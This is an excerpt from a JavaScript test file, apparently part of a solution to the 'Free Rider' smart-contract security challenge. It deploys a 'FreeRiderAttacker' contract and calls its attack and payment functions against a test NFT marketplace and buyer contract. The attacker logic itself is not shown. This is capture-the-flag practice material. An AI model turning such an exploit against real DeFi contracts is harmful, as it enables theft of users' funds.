...
describe("[Challenge] Free Rider", function () {
  ...
  it("Exploit", async function () {
    let attackerContract = await (
      await ethers.getContractFactory("FreeRiderAttacker", deployer)
    ).deploy(
      this.weth.address,
    ...
    await attackerContract
      .connect(attacker)
      .attack(this.weth.address, this.token.address, NFT_PRICE);

    await attackerContract
      .connect(attacker)
      .getPayment(this.buyerContract.address, this.nft.address);
  });
